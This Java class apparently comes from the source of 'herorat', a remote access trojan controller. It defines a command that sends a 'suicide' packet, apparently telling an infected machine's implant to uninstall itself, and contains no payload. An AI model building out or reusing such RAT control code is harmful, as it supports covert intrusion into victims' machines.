package net.herorat.features.suicide;

import net.herorat.features.servers.Server;
import net.herorat.network.Packet;
import net.herorat.network.Packet17Suicide;


public class Suicide
{
	public static void send(Server server)
	{
		Packet p = new Packet17Suicide(server.outputstream, new String[] { });
		p.write();
	}
	
	public static void handle(Server server, String[] args)
	{
	}
}